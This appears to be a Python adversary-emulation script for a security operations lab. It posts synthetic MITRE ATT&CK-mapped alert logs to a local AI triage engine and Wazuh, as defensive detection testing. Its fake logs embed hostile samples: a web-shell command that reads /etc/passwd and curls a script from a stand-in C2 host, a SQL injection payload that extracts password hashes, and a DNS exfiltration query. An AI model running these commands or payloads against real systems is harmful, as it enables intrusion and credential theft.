#!/usr/bin/env python3
"""
Adversary Emulation & Multi-Stage Attack Simulation Suite.

Simulates enterprise adversary behaviors mapped to MITRE ATT&CK techniques
and verifies SIEM detection, SOAR enrichment, and AI triage across the lab.
"""

import argparse
import json
import socket
import sys
import time
from datetime import datetime, timezone
import httpx

AI_ENGINE_DEFAULT = "http://localhost:8888"
WAZUH_SYSLOG_DEFAULT = ("localhost", 514)


def get_iso_timestamp():
    return datetime.now(timezone.utc).isoformat()


# Attack definitions mapped to MITRE ATT&CK techniques
ATTACK_SCENARIOS = {
    "ssh-bruteforce": {
        "name": "SSH Brute Force followed by Compromise",
        "technique_id": "T1110",
        "tactic": "Credential Access",
        "wazuh_rule": "100001",
        "severity": 13,
        "source_ip": "198.51.100.45",
        "dest_ip": "10.0.0.15",
        "hostname": "prod-web-01",
        "raw_log": (
            "sshd[12450]: Failed password for invalid user admin from 198.51.100.45 port 44321 ssh2\n"
            "sshd[12455]: Failed password for root from 198.51.100.45 port 44322 ssh2 (x12 attempts)\n"
            "sshd[12490]: Accepted password for root from 198.51.100.45 port 44325 ssh2"
        ),
        "misp_context": {
            "found": True,
            "threat_level": "high",
            "tags": ["apt-brute-force", "botnet-scanner"],
        },
    },
    "port-scan": {
        "name": "Network Service Discovery / Nmap SYN Scan",
        "technique_id": "T1046",
        "tactic": "Discovery",
        "wazuh_rule": "ET-SCAN-001",
        "severity": 8,
        "source_ip": "198.51.100.88",
        "dest_ip": "10.0.0.0/24",
        "hostname": "edge-firewall-01",
        "raw_log": (
            "suricata[3100]: [1:2001219:19] ET SCAN Potential Nmap SYN Scan "
            "[Classification: Attempted Information Leak] [Priority: 2] "
            "{TCP} 198.51.100.88:51234 -> 10.0.0.15:80"
        ),
        "misp_context": {"found": False},
    },
    "sql-injection": {
        "name": "Web Application SQL Injection (UNION Based)",
        "technique_id": "T1190",
        "tactic": "Initial Access",
        "wazuh_rule": "31103",
        "severity": 11,
        "source_ip": "203.0.113.72",
        "dest_ip": "10.0.0.20",
        "hostname": "app-portal-02",
        "raw_log": (
            "nginx: 203.0.113.72 - - [29/Sep/2026:12:01:05 +0000] "
            '"POST /api/v1/auth/login HTTP/1.1" 500 842 '
            '"http://app-portal-02/login" "sqlmap/1.7.2#stable" '
            'payload="\' UNION SELECT null, username, password_hash FROM users--"'
        ),
        "misp_context": {
            "found": True,
            "threat_level": "high",
            "tags": ["sqli-exploit", "cve-2024-web"],
        },
    },
    "web-shell": {
        "name": "Web Shell Persistence & Arbitrary Command Execution",
        "technique_id": "T1505.003",
        "tactic": "Persistence",
        "wazuh_rule": "100003",
        "severity": 14,
        "source_ip": "203.0.113.99",
        "dest_ip": "10.0.0.20",
        "hostname": "app-portal-02",
        "raw_log": (
            "apache2[4512]: [core:notice] mod_php: command execution detected via /uploads/shell.php "
            "parent=apache2 child=/bin/bash cmd=\"whoami; cat /etc/passwd; curl http://c2.evil/agent.sh\""
        ),
        "misp_context": {
            "found": True,
            "threat_level": "critical",
            "tags": ["web-shell", "c2-download"],
        },
    },
    "privilege-escalation": {
        "name": "Unauthorized Sudo Abuse / Sudoers Bypass",
        "technique_id": "T1068",
        "tactic": "Privilege Escalation",
        "wazuh_rule": "100002",
        "severity": 12,
        "source_ip": None,
        "dest_ip": None,
        "hostname": "linux-dev-node",
        "raw_log": (
            "sudo: webuser : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; "
            "USER=root ; COMMAND=/bin/bash -p"
        ),
        "misp_context": None,
    },
    "ransomware-fim": {
        "name": "Ransomware Mass File Encryption (FIM Trigger)",
        "technique_id": "T1486",
        "tactic": "Impact",
        "wazuh_rule": "100006",
        "severity": 15,
        "source_ip": None,
        "dest_ip": None,
        "hostname": "finance-fs-01",
        "raw_log": (
            "ossec: File integrity monitoring alert: Mass file extensions modified to .encrypted "
            "in C:\\Shares\\Finance\\ (64 files changed in 12 seconds). Process: lockbit_payload.exe"
        ),
        "misp_context": {
            "found": True,
            "threat_level": "critical",
            "tags": ["ransomware", "lockbit", "fim-anomaly"],
        },
    },
    "data-exfil-dns": {
        "name": "DNS Tunneling & C2 Data Exfiltration",
        "technique_id": "T1071.004",
        "tactic": "Exfiltration",
        "wazuh_rule": "100008",
        "severity": 10,
        "source_ip": "10.0.0.105",
        "dest_ip": "8.8.8.8",
        "hostname": "hr-workstation-03",
        "raw_log": (
            "zeek: dns.log query: a7f89b1c2d3e.exfil.attacker-domain.xyz qtype: TXT "
            "query_length: 124 bytes | High query frequency: 3200 requests/10min"
        ),
        "misp_context": {
            "found": True,
            "threat_level": "high",
            "tags": ["dns-tunnel", "exfiltration"],
        },
    },
    "pass-the-hash": {
        "name": "Windows NTLM Pass-the-Hash / Lateral Movement",
        "technique_id": "T1550.002",
        "tactic": "Lateral Movement",
        "wazuh_rule": "100007",
        "severity": 12,
        "source_ip": "10.0.0.110",
        "dest_ip": "10.0.0.5",
        "hostname": "dc-ad-01",
        "raw_log": (
            "Microsoft-Windows-Security-Auditing: EventID 4624 "
            "An account was successfully logged on. "
            "LogonType: 3 AuthenticationPackageName: NTLM "
            "TargetUserName: Administrator WorkstationName: ATTACK-WS "
            "SourceNetworkAddress: 10.0.0.110"
        ),
        "misp_context": None,
    },
}


def send_to_ai_engine(scenario_key: str, engine_url: str):
    data = ATTACK_SCENARIOS[scenario_key]
    payload = {
        "alert_id": f"SIM-{scenario_key.upper()}-{int(time.time())}",
        "source": "wazuh",
        "rule_id": data["wazuh_rule"],
        "rule_description": f"{data['name']} ({data['technique_id']})",
        "severity": data["severity"],
        "source_ip": data.get("source_ip"),
        "dest_ip": data.get("dest_ip"),
        "hostname": data["hostname"],
        "timestamp": get_iso_timestamp(),
        "raw_log": data["raw_log"],
        "misp_context": data.get("misp_context"),
    }

    print(f"\n[+] Sending scenario '{scenario_key}' to AI Engine at {engine_url}/analyze")
    print(f"    Target: {data['name']} [{data['technique_id']}]")
    print(f"    Severity: {data['severity']} | Rule: {data['wazuh_rule']}")

    try:
        with httpx.Client(timeout=60.0) as client:
            resp = client.post(f"{engine_url}/analyze", json=payload)
            resp.raise_for_status()
            res = resp.json()
            print("\n" + "=" * 60)
            print(f"[*] AI TRIAGE RESULTS FOR {scenario_key.upper()}:")
            print(f"    Verdict       : {res['verdict']}")
            print(f"    Confidence    : {res['confidence']:.0%}")
            print(f"    Severity      : {res['severity_normalized']}")
            print(f"    MITRE Tactic  : {res['mitre_tactic']}")
            print(f"    MITRE Technique: {res['mitre_technique']}")
            print(f"\n[*] Incident Summary:")
            print(f"    {res['summary']}")
            print(f"\n[*] Response Recommendation:")
            print(f"    {res['response_recommendation']}")
            print("\n[*] Dynamic Playbook Steps:")
            for idx, step in enumerate(res.get("playbook_steps", []), 1):
                print(f"    {idx}. {step}")
            print(f"[*] Processing Time: {res['processing_time_ms']}ms")
            print("=" * 60)
            return True
    except httpx.ConnectError:
        print(f"[-] Could not connect to AI Engine at {engine_url}. Is it running?")
        return False
    except Exception as e:
        print(f"[-] Analysis request failed: {e}")
        return False


def send_syslog_to_wazuh(scenario_key: str, host: str, port: int):
    data = ATTACK_SCENARIOS[scenario_key]
    message = (
        f"<134>{datetime.now().strftime('%b %d %H:%M:%S')} {data['hostname']} "
        f"attack_simulation[{scenario_key}]: {data['raw_log']}"
    )
    print(f"[+] Sending Syslog UDP message for '{scenario_key}' to {host}:{port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(message.encode("utf-8"), (host, port))
        sock.close()
        print(f"    Sent {len(message)} bytes successfully.")
        return True
    except Exception as e:
        print(f"[-] Failed to send UDP Syslog: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="AI-Augmented SOC Lab: Adversary Emulation & Simulation Suite"
    )
    parser.add_argument(
        "scenario",
        nargs="?",
        default="all",
        choices=list(ATTACK_SCENARIOS.keys()) + ["all"],
        help="Attack scenario to execute (default: all)",
    )
    parser.add_argument(
        "--engine-url",
        default=AI_ENGINE_DEFAULT,
        help="AI SOC Engine URL (default: http://localhost:8888)",
    )
    parser.add_argument(
        "--syslog",
        action="store_true",
        help="Also transmit raw event via UDP Syslog (port 514) to Wazuh Manager",
    )
    parser.add_argument(
        "--wazuh-host",
        default="localhost",
        help="Wazuh Manager host for Syslog (default: localhost)",
    )
    parser.add_argument(
        "--wazuh-port",
        type=int,
        default=514,
        help="Wazuh Manager UDP Syslog port (default: 514)",
    )

    args = parser.parse_args()

    targets = list(ATTACK_SCENARIOS.keys()) if args.scenario == "all" else [args.scenario]

    print("=" * 60)
    print("   AI-AUGMENTED SOC LAB - ATTACK SIMULATION RUNNER")
    print("=" * 60)
    print(f"Total Scenarios to Run: {len(targets)}")

    success_count = 0
    for target in targets:
        if args.syslog:
            send_syslog_to_wazuh(target, args.wazuh_host, args.wazuh_port)
        if send_to_ai_engine(target, args.engine_url):
            success_count += 1
        time.sleep(1)

    print(f"\n[+] Execution complete. Successful simulations: {success_count}/{len(targets)}")


if __name__ == "__main__":
    main()
